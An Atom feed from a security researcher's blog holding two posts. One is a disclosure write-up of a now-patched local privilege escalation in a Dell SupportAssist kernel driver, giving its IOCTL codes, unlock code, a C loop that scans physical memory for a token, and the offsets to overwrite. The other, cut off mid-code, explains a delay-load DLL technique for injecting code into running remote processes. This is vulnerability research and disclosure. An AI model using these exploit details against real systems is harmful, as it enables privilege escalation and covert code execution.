<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[]]></title>
  <link href="http://hatRiot.github.io/atom.xml" rel="self"/>
  <link href="http://hatRiot.github.io/"/>
  <updated>2018-05-18T09:39:16-07:00</updated>
  <id>http://hatRiot.github.io/</id>
  <author>
    <name><![CDATA[Bryan Alexander]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Dell SupportAssist Driver - Local Privilege Escalation]]></title>
    <link href="http://hatRiot.github.io/blog/2018/05/17/dell-supportassist-local-privilege-escalation/"/>
    <updated>2018-05-17T21:00:00-07:00</updated>
    <id>http://hatRiot.github.io/blog/2018/05/17/dell-supportassist-local-privilege-escalation</id>
    <content type="html"><![CDATA[<p>This post details a local privilege escalation (LPE) vulnerability I found
in Dell&rsquo;s SupportAssist[0] tool. The bug is in a kernel driver loaded by
the tool, and is pretty similar to bugs found by ReWolf in
ntiolib.sys/winio.sys[1], and those found by others in ASMMAP/ASMMAP64[2].
These bugs are pretty interesting because they can be used to bypass driver
signature enforcement (DSE) ad infinitum, or at least until they&rsquo;re no longer
compatible with newer operating systems.</p>

<p>Dell&rsquo;s SupportAssist is, according to the site, &ldquo;(..) now preinstalled on most
of all new Dell devices running Windows operating system (..)&rdquo;. It&rsquo;s primary
purpose is to troubleshoot issues and provide support capabilities both to the
user and to Dell. There&rsquo;s quite a lot of functionality in this software itself,
which I spent quite a bit of time reversing and may blog about at a later date.</p>

<h2>Bug</h2>

<p>Calling this a &ldquo;bug&rdquo; is really a misnomer; the driver exposes this
functionality eagerly. It actually exposes a lot of functionality, much like
some of the previously mentioned drivers. It provides capabilities for reading
and writing the model-specific register (MSR), resetting the 1394 bus, and
reading/writing CMOS.</p>

<p>The driver is first loaded when the SupportAssist tool is launched, and the
filename is <code>pcdsrvc_x64.pkms</code> on x64 and <code>pcdsrvc.pkms</code> on x86. Incidentally,
this driver isn&rsquo;t actually even built by Dell, but rather another company,
PC-Doctor[3]. This company provides &ldquo;system health solutions&rdquo; to a variety of
companies, including Dell, Intel, Yokogawa, IBM, and others. Therefore, it&rsquo;s
highly likely that this driver can be found in a variety of other products&hellip;</p>

<p>Once the driver is loaded, it exposes a symlink to the device at
<code>PCDSRVC{3B54B31B-D06B6431-06020200}_0</code> which is writable by unprivileged users
on the system. This allows us to trigger one of the many IOCTLs exposed by the
driver; approximately 30. I found a DLL used by the userland agent that served
as an interface to the kernel driver and conveniently had symbol names
available, allowing me to extract the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>// 0x222004 = driver activation ioctl
</span><span class='line'>// 0x222314 = IoDriver::writePortData
</span><span class='line'>// 0x22230c = IoDriver::writePortData
</span><span class='line'>// 0x222304 = IoDriver::writePortData
</span><span class='line'>// 0x222300 = IoDriver::readPortData
</span><span class='line'>// 0x222308 = IoDriver::readPortData
</span><span class='line'>// 0x222310 = IoDriver::readPortData
</span><span class='line'>// 0x222700 = EcDriver::readData
</span><span class='line'>// 0x222704 = EcDriver::writeData
</span><span class='line'>// 0x222080 = MemDriver::getPhysicalAddress
</span><span class='line'>// 0x222084 = MemDriver::readPhysicalMemory
</span><span class='line'>// 0x222088 = MemDriver::writePhysicalMemory
</span><span class='line'>// 0x222180 = Msr::readMsr
</span><span class='line'>// 0x222184 = Msr::writeMsr
</span><span class='line'>// 0x222104 = PciDriver::readConfigSpace
</span><span class='line'>// 0x222108 = PciDriver::writeConfigSpace
</span><span class='line'>// 0x222110 = PciDriver::?
</span><span class='line'>// 0x22210c = PciDriver::?
</span><span class='line'>// 0x222380 = Port1394::doesControllerExist
</span><span class='line'>// 0x222384 = Port1394::getControllerConfigRom
</span><span class='line'>// 0x22238c = Port1394::getGenerationCount
</span><span class='line'>// 0x222388 = Port1394::forceBusReset
</span><span class='line'>// 0x222680 = SmbusDriver::genericRead
</span><span class='line'>// 0x222318 = SystemDriver::readCmos8
</span><span class='line'>// 0x22231c = SystemDriver::writeCmos8
</span><span class='line'>// 0x222600 = SystemDriver::getDevicePdo
</span><span class='line'>// 0x222604 = SystemDriver::getIntelFreqClockCounts
</span><span class='line'>// 0x222608 = SystemDriver::getAcpiThermalZoneInfo</span></code></pre></td></tr></table></div></figure>


<p>Immediately the MemDriver class jumps out. After some reversing, it appeared
that these functions do exactly as expected: allow userland services to both
read and write arbitrary physical addresses. There are a few quirks, however.</p>

<p>To start, the driver must first be &ldquo;unlocked&rdquo; in order for it to begin
processing control codes. It&rsquo;s unclear to me if this is some sort of hacky
event trigger or whether the kernel developers truly believed this would
inhibit malicious access. Either way, it&rsquo;s goofy. To unlock the driver, a
simple ioctl with the proper code must be sent. Once received, the driver will
process control codes for the lifetime of the system.</p>

<p>To unlock the driver, we just execute the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>BOOL bResult;
</span><span class='line'>DWORD dwRet;
</span><span class='line'>SIZE_T code = 0xA1B2C3D4, outBuf;
</span><span class='line'>
</span><span class='line'>bResult = DeviceIoControl(hDriver, 0x222004, 
</span><span class='line'>                          &code, sizeof(SIZE_T), 
</span><span class='line'>                          &outBuf, sizeof(SIZE_T), 
</span><span class='line'>                          &dwRet, NULL);</span></code></pre></td></tr></table></div></figure>


<p>Once the driver receives this control code and validates the received code
(0xA1B2C3D4), it sets a global flag and begins accepting all other control
codes.</p>

<h2>Exploitation</h2>

<p>From here, we could exploit this the same way rewolf did [4]: read out physical
memory looking for process pool tags, then traverse these until we identify our
process as well as a SYSTEM process, then steal the token. However, PCD
appears to give us a shortcut via <code>getPhysicalAddress</code> ioctl. If this does
indeed return the physical address of a given virtual address (VA), we can simply
find the physical of our VA and enable a couple token privileges[5] using the
<code>writePhysicalMemory</code> ioctl.</p>

<p>Here&rsquo;s how the <code>getPhysicalAddress</code> function works:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>v5 = IoAllocateMdl(**(PVOID **)(a1 + 0x18), 1u, 0, 0, 0i64);
</span><span class='line'>v6 = v5;
</span><span class='line'>if ( !v5 )
</span><span class='line'>  return 0xC0000001i64;
</span><span class='line'>MmProbeAndLockPages(v5, 1, 0);
</span><span class='line'>**(_QWORD **)(v3 + 0x18) = v4 & 0xFFF | ((_QWORD)v6[1].Next &lt;&lt; 0xC);
</span><span class='line'>MmUnlockPages(v6);
</span><span class='line'>IoFreeMdl(v6);</span></code></pre></td></tr></table></div></figure>


<p>Keen observers will spot the problem here; the <code>MmProbeAndLockPages</code> call is
passing in UserMode for the KPROCESSOR_MODE, meaning we won&rsquo;t be able to
resolve any kernel mode VAs, only usermode addresses.</p>

<p>We can still read chunks of physical memory unabated, however, as the
<code>readPhysicalMemory</code> function is quite simple:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if ( !DoWrite )
</span><span class='line'>{
</span><span class='line'>  memmove(a1, a2, a3);
</span><span class='line'>  return 1;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>They reuse a single function for reading and writing physical memory; we&rsquo;ll
return to that. I decided to take a different approach than rewolf for a number
of reasons with great results.</p>

<p>Instead, I wanted to toggle on SeDebugPrivilege for my current process token.
This would require finding the token in memory and writing a few bytes at a
field offset. To do this, I used <code>readPhysicalMemory</code> to read chunks of memory
of size 0x10000000 and checked for the first field in a _TOKEN, TokenSource. In
a user token, this will be the string <code>User32</code>. Once we&rsquo;ve identified this,
we double check that we&rsquo;ve found a token by validating the TokenLuid, which we
can obtain from userland using the GetTokenInformation API.</p>

<p>In order to speed up the memory search, I only iterate over the addresses that
match the token&rsquo;s virtual address byte index. Essentially, when you convert a
virtual address to a physical address (PA) the byte index, or the lower 12 bits,
do not change. To demonstrate, assume we have a VA of 0xfffff8a001cc2060.
Translating this to a physical address then:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; !pte  fffff8a001cc2060
</span><span class='line'>                                           VA fffff8a001cc2060
</span><span class='line'>PXE at FFFFF6FB7DBEDF88    PPE at FFFFF6FB7DBF1400    PDE at FFFFF6FB7E280070    PTE at FFFFF6FC5000E610
</span><span class='line'>contains 000000007AC84863  contains 00000000030D4863  contains 0000000073147863  contains E6500000716FD963
</span><span class='line'>pfn 7ac84     ---DA--KWEV  pfn 30d4      ---DA--KWEV  pfn 73147     ---DA--KWEV  pfn 716fd     -G-DA--KW-V
</span><span class='line'>
</span><span class='line'>kd&gt; ? 716fd * 0x1000 + 060
</span><span class='line'>Evaluate expression: 1903153248 = 00000000`716fd060</span></code></pre></td></tr></table></div></figure>


<p>So our physical address is 0x716fd060 (if you&rsquo;d like to read more about
converting VA to PA, check out this great Microsoft article[6]). Notice the
lower 12 bits remain the same between VA/PA. The search loop then boiled down
to the following code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>uStartAddr = uStartAddr + (VirtualAddress & 0xfff);
</span><span class='line'>for (USHORT chunk = 0; chunk &lt; 0xb; ++chunk) {
</span><span class='line'>    lpMemBuf = ReadBlockMem(hDriver, uStartAddr, 0x10000000);
</span><span class='line'>    for(SIZE_T i = 0; i &lt; 0x10000000; i += 0x1000, uStartAddr += 0x1000){
</span><span class='line'>        if (memcmp((DWORD)lpMemBuf + i, "User32 ", 8) == 0){
</span><span class='line'>            
</span><span class='line'>            if (TokenId &lt;= 0x0)
</span><span class='line'>                FetchTokenId();
</span><span class='line'>
</span><span class='line'>            if (*(DWORD*)((char*)lpMemBuf + i + 0x10) == TokenId) {
</span><span class='line'>                hTokenAddr = uStartAddr;
</span><span class='line'>                break;
</span><span class='line'>            }
</span><span class='line'>        }
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>    HeapFree(GetProcessHeap(), 0, lpMemBuf);
</span><span class='line'>
</span><span class='line'>    if (hTokenAddr &gt; 0x0)
</span><span class='line'>        break;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>Once we identify the PA of our token, we trigger two separate writes at offset
0x40 and offset 0x48, or the Enabled and Default fields of a _TOKEN. This
sometimes requires a few runs to get right (due to mapping, which I was too
lazy to work out), but is very stable.</p>

<p>You can find the source code for the bug <a href="https://github.com/hatRiot/bugs">here</a>.</p>

<h2>Timeline</h2>

<p>04/05/18 &ndash; Vulnerability reported<br/>
04/06/18 &ndash; Initial response from Dell<br/>
04/10/18 &ndash; Status update from Dell<br/>
04/18/18 &ndash; Status update from Dell<br/>
05/16/18 &ndash; Patched version released (v2.2)</p>

<h2>References</h2>

<p>[0]
<a href="http://www.dell.com/support/contents/us/en/04/article/product-support/self-support-knowledgebase/software-and-downloads/supportassist%0A">http://www.dell.com/support/contents/us/en/04/article/product-support/self-support-knowledgebase/software-and-downloads/supportassist
</a>[1] <a href="http://blog.rewolf.pl/blog/?p=1630%0A">http://blog.rewolf.pl/blog/?p=1630
</a>[2] <a href="https://www.exploit-db.com/exploits/39785/%0A">https://www.exploit-db.com/exploits/39785/
</a>[3] <a href="http://www.pc-doctor.com/%0A">http://www.pc-doctor.com/
</a>[4] <a href="https://github.com/rwfpl/rewolf-msi-exploit%0A">https://github.com/rwfpl/rewolf-msi-exploit
</a>[5] <a href="https://github.com/hatRiot/token-priv%0A">https://github.com/hatRiot/token-priv
</a>[6]
<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/converting-virtual-addresses-to-physical-addresses\">https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/converting-virtual-addresses-to-physical-addresses\</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Abusing delay load DLLs for remote code injection]]></title>
    <link href="http://hatRiot.github.io/blog/2017/09/19/abusing-delay-load-dll/"/>
    <updated>2017-09-19T14:00:00-07:00</updated>
    <id>http://hatRiot.github.io/blog/2017/09/19/abusing-delay-load-dll</id>
    <content type="html"><![CDATA[<p>I always tell myself that I&rsquo;ll try posting more frequently on my blog, and yet
here I am, two years later.  Perhaps this post will provide the necessary
motiviation to conduct more public research.  I do love it.</p>

<p>This post details a novel remote code injection technique I discovered while
playing around with delay loading DLLs.  It allows for the injection of
arbitrary code into arbitrary remote, running processes, provided that they
implement the abused functionality.  To make it abundantly clear, this is not
an exploit, it&rsquo;s simply another strategy for migrating into other processes.</p>

<p>Modern code injection techniques typically rely on a variation of two different
win32 API calls: CreateRemoteThread and NtQueueApc.  Endgame recently put out a
great article[0] detailing ten various methods of process injection.  While not
all of them allow for injection into remote processes, particularly those
already running, it does detail the most common, public variations.  This
strategy is more akin to inline hooking, though we&rsquo;re not touching the IAT
and we don&rsquo;t require our code to already be in the process.  There are no calls
to NtQueueApc or CreateRemoteThread, and no need for thread or process
suspension.  There are some limitations, as with anything, which I&rsquo;ll detail
below.</p>

<h2>Delay Load DLL</h2>

<p>Delay loading is a linker strategy that allows for the lazy loading of DLLs.
Executables commonly load all necessary dynamically linked libraries at runtime
and perform the IAT fix-ups then.  Delay loading, however, allows for
these libraries to be lazy loaded at call time, supported by a pseudo IAT
that&rsquo;s fixed-up on first call.  This process can be better illuminated by the
following, decades old figure below:</p>

<p><img src="http://hatRiot.github.io/images/posts/2017/delay.gif"></p>

<p>This image comes from a great Microsoft article released in 1998 [1] that
describes the strategy quite well, but I&rsquo;ll attempt to distill it here.</p>

<p>Portable executables contain a data directory named
<code>IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT</code>, which you can see using <code>dumpbin /imports</code>
or using windbg.  The structure of this entry is described in delayhlp.cpp,
included with the WinSDK:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>struct InternalImgDelayDescr {
</span><span class='line'>    DWORD           grAttrs;        // attributes
</span><span class='line'>    LPCSTR          szName;         // pointer to dll name
</span><span class='line'>    HMODULE *       phmod;          // address of module handle
</span><span class='line'>    PImgThunkData   pIAT;           // address of the IAT
</span><span class='line'>    PCImgThunkData  pINT;           // address of the INT
</span><span class='line'>    PCImgThunkData  pBoundIAT;      // address of the optional bound IAT
</span><span class='line'>    PCImgThunkData  pUnloadIAT;     // address of optional copy of original IAT
</span><span class='line'>    DWORD           dwTimeStamp;    // 0 if not bound,
</span><span class='line'>                                    // O.W. date/time stamp of DLL bound to (Old BIND)
</span><span class='line'>    };</span></code></pre></td></tr></table></div></figure>


<p>The table itself contains RVAs, not pointers.  We can find the delay directory
offset by parsing the file header:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0:022&gt; lm m explorer
</span><span class='line'>start    end        module name
</span><span class='line'>00690000 00969000   explorer   (pdb symbols)          
</span><span class='line'>0:022&gt; !dh 00690000 -f
</span><span class='line'>
</span><span class='line'>File Type: EXECUTABLE IMAGE
</span><span class='line'>FILE HEADER VALUES
</span><span class='line'>
</span><span class='line'>[...] 
</span><span class='line'>
</span><span class='line'>   68A80 [      40] address [size] of Load Configuration Directory
</span><span class='line'>       0 [       0] address [size] of Bound Import Directory
</span><span class='line'>    1000 [     D98] address [size] of Import Address Table Directory
</span><span class='line'>   AC670 [     140] address [size] of Delay Import Directory
</span><span class='line'>       0 [       0] address [size] of COR20 Header Directory
</span><span class='line'>       0 [       0] address [size] of Reserved Directory</span></code></pre></td></tr></table></div></figure>


<p>The first entry and it&rsquo;s delay linked DLL can be seen in the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0:022&gt; dd 00690000+ac670 l8
</span><span class='line'>0073c670  00000001 000ac7b0 000b24d8 000b1000
</span><span class='line'>0073c680  000ac8cc 00000000 00000000 00000000
</span><span class='line'>0:022&gt; da 00690000+000ac7b0 
</span><span class='line'>0073c7b0  "WINMM.dll"</span></code></pre></td></tr></table></div></figure>


<p>This means that WINMM is dynamically linked to explorer.exe, but delay loaded,
and will not be loaded into the process until the imported function is invoked.
Once loaded, a helper function fixes up the psuedo IAT by using GetProcAddress
to locate the desired function and patching the table at runtime.</p>

<p>The pseudo IAT referenced is separate from the standard PE IAT; this IAT
is specifically for the delay load functions, and is referenced from the delay
descriptor.  So for example, in WINMM.dll&rsquo;s case, the pseudo IAT for WINMM is
at RVA 000b1000.  The second delay descriptor entry would have a separate RVA
for its pseudo IAT, and so on and so forth.</p>

<p>Using WINMM as our delay example, explorer imports one function from it, <code>PlaySoundW</code>.
In my particular running instance, it has not been invoked, so the pseudo IAT
has not been fixed up yet.  We can see this by dumping it&rsquo;s pseudo IAT entry:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0:022&gt; dps 00690000+000b1000 l2
</span><span class='line'>00741000  006dd0ac explorer!_imp_load__PlaySoundW
</span><span class='line'>00741004  00000000</span></code></pre></td></tr></table></div></figure>


<p>Each DLL entry is null terminated.  The above pointer shows us that the existing
entry is merely a springboard thunk within the Explorer process.  This takes
us here:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0:022&gt; u explorer!_imp_load__PlaySoundW
</span><span class='line'>explorer!_imp_load__PlaySoundW:
</span><span class='line'>006dd0ac b800107400      mov     eax,offset explorer!_imp__PlaySoundW (00741000)
</span><span class='line'>006dd0b1 eb00            jmp     explorer!_tailMerge_WINMM_dll (006dd0b3)
</span><span class='line'>explorer!_tailMerge_WINMM_dll:
</span><span class='line'>006dd0b3 51              push    ecx
</span><span class='line'>006dd0b4 52              push    edx
</span><span class='line'>006dd0b5 50              push    eax
</span><span class='line'>006dd0b6 6870c67300      push    offset explorer!_DELAY_IMPORT_DESCRIPTOR_WINMM_dll (0073c670)
</span><span class='line'>006dd0bb e8296cfdff      call    explorer!__delayLoadHelper2 (006b3ce9)</span></code></pre></td></tr></table></div></figure>


<p>The tailMerge function is a linker-generated stub that&rsquo;s compiled in per-DLL,
not per function.  The <code>__delayLoadHelper2</code> function is the magic that
handles the loading and patching of the pseudo IAT.  Documented in delayhlp.cpp,
this function handles calling LoadLibrary/GetProcAddress and patching the
pseudo IAT.  As a demonstration of how this looks, I compiled a binary that
delay links dnslib.  Here&rsquo;s the process of resolution of
DnsAcquireContextHandle:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0:000&gt; dps 00060000+0001839c l2
</span><span class='line'>0007839c  000618bd DelayTest!_imp_load_DnsAcquireContextHandle_W
</span><span class='line'>000783a0  00000000
</span><span class='line'>0:000&gt; bp DelayTest!__delayLoadHelper2
</span><span class='line'>0:000&gt; g
</span><span class='line'>ModLoad: 753e0000 7542c000   C:\Windows\system32\apphelp.dll
</span><span class='line'>Breakpoint 0 hit
</span><span class='line'>[...]
</span><span class='line'>0:000&gt; dd esp+4 l1
</span><span class='line'>0024f9f4  00075ffc
</span><span class='line'>0:000&gt; dd 00075ffc l4
</span><span class='line'>00075ffc  00000001 00010fb0 000183c8 0001839c
</span><span class='line'>0:000&gt; da 00060000+00010fb0 
</span><span class='line'>00070fb0  "DNSAPI.dll"
</span><span class='line'>0:000&gt; pt
</span><span class='line'>0:000&gt; dps 00060000+0001839c l2
</span><span class='line'>0007839c  74dfd0fc DNSAPI!DnsAcquireContextHandle_W
</span><span class='line'>000783a0  00000000</span></code></pre></td></tr></table></div></figure>


<p>Now the pseudo IAT entry has been patched up and the correct function is
invoked on subsequent calls.  This has the additional side effect of leaving
the pseudo IAT as both executable and writable:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0:011&gt; !vprot 00060000+0001839c
</span><span class='line'>BaseAddress:       00371000
</span><span class='line'>AllocationBase:    00060000
</span><span class='line'>AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY</span></code></pre></td></tr></table></div></figure>


<p>At this point, the DLL has been loaded into the process and the pseudo IAT
patched up.  In another additional twist, not all functions are resolved on
load, only the one that is invoked.  This leaves certain entries in the
pseudo IAT in a mixed state:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>00741044  00726afa explorer!_imp_load__UnInitProcessPriv
</span><span class='line'>00741048  7467f845 DUI70!InitThread
</span><span class='line'>0074104c  00726b0f explorer!_imp_load__UnInitThread
</span><span class='line'>00741050  74670728 DUI70!InitProcessPriv
</span><span class='line'>0:022&gt; lm m DUI70
</span><span class='line'>start    end        module name
</span><span class='line'>74630000 746e2000   DUI70      (pdb symbols)</span></code></pre></td></tr></table></div></figure>


<p>In the above, two of the four functions are resolved and the DUI70.dll library
is loaded into the process.  In each entry of the delay load descriptor, the
structure referenced above maintains an RVA to the HMODULE.  If the module
isn&rsquo;t loaded, it will be null.  So when a delayed function is invoked that&rsquo;s
already loaded, the delay helper function will check it&rsquo;s entry to determine if
a handle to it can be used:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>HMODULE hmod = *idd.phmod;
</span><span class='line'>    if (hmod == 0) {
</span><span class='line'>        if (__pfnDliNotifyHook2) {
</span><span class='line'>            hmod = HMODULE(((*__pfnDliNotifyHook2)(dliNotePreLoadLibrary, &dli)));
</span><span class='line'>            }
</span><span class='line'>        if (hmod == 0) {
</span><span class='line'>            hmod = ::LoadLibraryEx(dli.szDll, NULL, 0);
</span><span class='line'>            }</span></code></pre></td></tr></table></div></figure>


<p>The <code>idd</code> structure is just an instance of the InternalImgDelayDescr described
above and passed into the <code>__delayLoadHelper2</code> function from the linker
tailMerge stub.  So if the module is already loaded, as referenced from delay
entry, then it uses that handle instead.  It does NOT attempt to LoadLibrary
irregardless of this value; this can be used to our advantage.</p>

<p>Another note here is that the delay loader supports notification hooks.  There
are six states we can hook into: processing start, pre load library, fail
load library, pre GetProcAddress, fail GetProcAddress, and end processing.  You
can see how the hooks are used in the above code sample.</p>

<p>Finally, in addition to delay loading, the portable executable also supports
delay library unloading.  It works pretty much how you&rsquo;d expect it, so we
won&rsquo;t be touching on it here.</p>

<h2>Limitations</h2>

<p>Before detailing how we might abuse this (though it should be fairly obvious),
it&rsquo;s important to note the limitations of this technique.  It is not completely
portable, and using pure delay load functionality it cannot be made to be so.</p>

<p>The glaring limitation is that the technique requires the remote process to be
delay linked.  A brief crawl of some local processes on my host shows many
Microsoft applications are: dwm, explorer, cmd.  Many non-Microsoft
applications are as well, including Chrome.  It is additionally a well
supported function of the portable executable, and exists today on modern
systems.</p>

<p>Another limitation is that, because at it&rsquo;s core it relies on LoadLibrary,
there must exist a DLL on disk.  There is no way to LoadLibrary from memory
(unless you use one of the countless techniques to do that, but none of which
use LoadLibrary&hellip;).</p>

<p>In addition to implementing the delay load, the remote process must implement
functionality that can be triggered.  Instead of doing a CreateRemoteThread,
SendNotifyMessage, or ResumeThread, we rely on the fetch to the pseudo IAT, and
thus we must be able to trigger the remote process into performing this
action/executing this function.  This is generally pretty easy if you&rsquo;re using
the suspended process/new process strategy, but may not be trivial on running
applications.</p>

<p>Finally, any process that does not allow unsigned libraries to be loaded will
block this technique.  This is controlled by ProcessSignaturePolicy and can be
set with SetProcessMitigationPolicy[2]; it is unclear how many apps are using
this at the moment, but Microsoft Edge was one of the first big products to be
employing this policy.  This technique is also impacted by the
ProcessImageLoadPolicy policy, which can be set to restrict loading of images
from a UNC share.</p>

<h2>Abuse</h2>

<p>When discussing an ability to inject code into a process, there are three
separate cases an attacker may consider, and some additional edge situations
within remote processes.  Local process injection is simply the execution of
shellcode/arbitrary code within the current process.  Suspended process is the
act of spawning a new, suspended process from an existing, controlled one and
injecting code into it.  This is a fairly common strategy to employ for
migrating code, setting up backup connections, or establishing a known process
state prior to injection.  The final case is the running remote process.</p>

<p>The running remote process is an interesting case with several caveats that
we&rsquo;ll explore below.  I won&rsquo;t detail suspended processes, as it&rsquo;s essentially
the same as a running process, but easier.  It&rsquo;s easier because many
applications actually just load the delay library at runtime, either because
the functionality is environmentally keyed and required then, or because
another loaded DLL is linked against it and requires it.  Refer to the source
code for the project for an implementation of suspended process injection [3].</p>

<h3>Local Process</h3>

<p>The local process is the most simple and arguably the most useless for this
strategy.  If we can inject and execute code in this manner, we might as well
link against the library we want to use.  It serves as a fine introduction to
the topic, though.</p>

<p>The first thing we need to do is delay link the executable against something.
For various reasons I originally chose <code>dnsapi.dll</code>.  You can specify delay
load DLLs via the linker options for Visual Studio.</p>

<p>With that, we need to obtain the RVA for the delay directory.  This can be
accomplished with the following function:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
